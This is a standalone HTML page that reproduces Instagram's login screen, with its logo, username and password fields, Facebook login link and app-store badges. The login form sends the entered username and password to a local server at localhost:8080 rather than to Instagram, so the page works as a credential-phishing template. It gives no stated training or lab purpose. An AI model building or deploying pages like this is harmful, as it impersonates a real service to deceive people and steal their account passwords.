<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Instagram</title>
<style>
  * { box-sizing: border-box; margin: 0; padding: 0; }

  body {
    background: #fafafa;
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    min-height: 100vh;
  }

  .container {
    display: flex;
    flex-direction: column;
    align-items: center;
    width: 100%;
    max-width: 350px;
  }

  .card {
    background: #fff;
    border: 1px solid #dbdbdb;
    border-radius: 1px;
    padding: 40px;
    width: 100%;
    text-align: center;
    margin-bottom: 10px;
  }

  .logo {
    font-family: "Billabong", cursive;
    font-size: 52px;
    margin-bottom: 24px;
    background: linear-gradient(45deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888);
    -webkit-background-clip: text;
    -webkit-text-fill-color: transparent;
    background-clip: text;
  }

  /* fallback if Billabong not available */
  @import url('https://fonts.googleapis.com/css2?family=Dancing+Script:wght@700&display=swap');
  .logo { font-family: 'Dancing Script', cursive; }

  input {
    width: 100%;
    background: #fafafa;
    border: 1px solid #dbdbdb;
    border-radius: 3px;
    padding: 9px 8px;
    font-size: 12px;
    color: #262626;
    margin-bottom: 6px;
    outline: none;
    transition: border-color 0.2s;
  }

  input:focus { border-color: #a8a8a8; }
  input::placeholder { color: #8e8e8e; }

  .login-btn {
    width: 100%;
    background: #0095f6;
    color: #fff;
    border: none;
    border-radius: 8px;
    padding: 8px;
    font-size: 14px;
    font-weight: 600;
    cursor: pointer;
    margin-top: 8px;
    opacity: 0.7;
    transition: opacity 0.2s;
  }

  .login-btn:hover { opacity: 1; }

  .divider {
    display: flex;
    align-items: center;
    gap: 18px;
    margin: 18px 0;
    color: #8e8e8e;
    font-size: 13px;
    font-weight: 600;
  }

  .divider::before, .divider::after {
    content: '';
    flex: 1;
    height: 1px;
    background: #dbdbdb;
  }

  .facebook-login {
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 8px;
    color: #385185;
    font-size: 14px;
    font-weight: 600;
    cursor: pointer;
    text-decoration: none;
  }

  .fb-icon {
    width: 18px; height: 18px;
    background: #385185;
    border-radius: 3px;
    color: #fff;
    display: flex;
    align-items: center;
    justify-content: center;
    font-size: 13px;
    font-weight: 700;
    font-family: serif;
  }

  .forgot {
    display: block;
    font-size: 12px;
    color: #00376b;
    text-decoration: none;
    margin-top: 16px;
  }

  .signup-card {
    background: #fff;
    border: 1px solid #dbdbdb;
    border-radius: 1px;
    padding: 20px;
    width: 100%;
    text-align: center;
    font-size: 14px;
    color: #262626;
    margin-bottom: 20px;
  }

  .signup-card a {
    color: #0095f6;
    font-weight: 600;
    text-decoration: none;
  }

  .get-app {
    font-size: 14px;
    color: #262626;
    margin-bottom: 16px;
  }

  .app-btns {
    display: flex;
    gap: 8px;
    justify-content: center;
  }

  .app-btn {
    border: 1px solid #262626;
    border-radius: 6px;
    padding: 6px 12px;
    font-size: 12px;
    color: #262626;
    display: flex;
    align-items: center;
    gap: 6px;
    cursor: pointer;
    text-decoration: none;
  }

  .app-btn span { font-size: 10px; display: block; }
  .app-btn strong { font-size: 13px; }
</style>
</head>
<body>

<div class="container">
  <div class="card">
    <div class="logo">Instagram</div>

    <form action="http://localhost:8080/login" method="POST">
      <input type="text" name="username"
             placeholder="Phone number, username, or email" required>
      <input type="password" name="password"
             placeholder="Password" required>
      <button type="submit" class="login-btn">Log in</button>
    </form>

    <div class="divider">OR</div>

    <a href="#" class="facebook-login">
      <div class="fb-icon">f</div>
      Log in with Facebook
    </a>

    <a href="#" class="forgot">Forgot password?</a>
  </div>

  <div class="signup-card">
    Don't have an account? <a href="#">Sign up</a>
  </div>

  <div class="get-app">Get the app.</div>
  <div class="app-btns">
    <a href="#" class="app-btn">
      <div>
        <span>Download on the</span>
        <strong>App Store</strong>
      </div>
    </a>
    <a href="#" class="app-btn">
      <div>
        <span>Get it on</span>
        <strong>Google Play</strong>
      </div>
    </a>
  </div>
</div>

</body>
</html>
